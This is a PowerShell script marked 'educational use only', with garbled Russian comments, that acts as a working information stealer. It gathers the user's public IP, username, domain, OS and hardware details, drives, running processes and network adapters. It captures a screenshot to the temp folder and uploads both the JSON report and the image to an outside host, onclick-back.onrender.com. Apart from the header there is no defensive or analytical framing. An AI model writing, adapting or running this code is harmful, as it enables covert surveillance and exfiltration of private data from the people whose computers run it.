# ‚ö†Ô∏è EDUCATIONAL USE ONLY

# –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$domain = $env:USERDOMAIN
$arch = $env:PROCESSOR_ARCHITECTURE
$osinfo = Get-CimInstance Win32_OperatingSystem
$os = $osinfo.Caption
$version = $osinfo.Version
$ram = [math]::Round($osinfo.TotalVisibleMemorySize / 1MB, 2)
$cpu = (Get-CimInstance Win32_Processor).Name
$drives = Get-PSDrive -PSProvider FileSystem | Select Name, Used, Free

# –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
$processes = Get-Process | Select-Object Name, Id, CPU, StartTime -ErrorAction SilentlyContinue

# –°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã
$netAdapters = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed

# –°–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$imgPath = \"$env:TEMP\\screen.jpg\"
$bitmap.Save($imgPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

# –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ JSON-–¥–∞–Ω–Ω—ã—Ö
$data = @{
  ip = $ip
  username = $user
  computer = $computer
  domain = $domain
  os = $os
  version = $version
  architecture = $arch
  cpu = $cpu
  ram = \"$ram GB\"
  drives = $drives
  netAdapters = $netAdapters
  processes = $processes[0..20]  # –û–≥—Ä–∞–Ω–∏—á–∏–º –≤—ã–≤–æ–¥
  timestamp = (Get-Date).ToString(\"s\")
}

# –û—Ç–ø—Ä–∞–≤–∫–∞ JSON
try {
  Invoke-RestMethod -Uri \"https://onclick-back.onrender.com/report\" `
    -Method POST `
    -Body ($data | ConvertTo-Json -Depth 6) `
    -ContentType \"application/json\"
  Write-Output \"‚úÖ JSON sent\"
} catch {
  Write-Warning \"‚ùå Failed to send JSON: $_\"
}

# –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ (–º—É–ª—å—Ç–∏—á–∞—Å—Ç—å)
try {
  $fileBytes = [System.IO.File]::ReadAllBytes($imgPath)
  $form = @{
    file = New-Object System.Net.Http.ByteArrayContent($fileBytes)
  }
  $form.file.Headers.Add(\"Content-Type\", \"image/jpeg\")
  $client = New-Object System.Net.Http.HttpClient
  $content = New-Object System.Net.Http.MultipartFormDataContent
  $content.Add($form.file, \"screenshot\", \"screen.jpg\")
  $response = $client.PostAsync(\"https://onclick-back.onrender.com/screenshot\", $content).Result
  $responseContent = $response.Content.ReadAsStringAsync().Result
  Write-Output \"üñºÔ∏è Screenshot upload response: $responseContent\"
} catch {
  Write-Warning \"‚ùå Failed to upload screenshot: $_\"
}
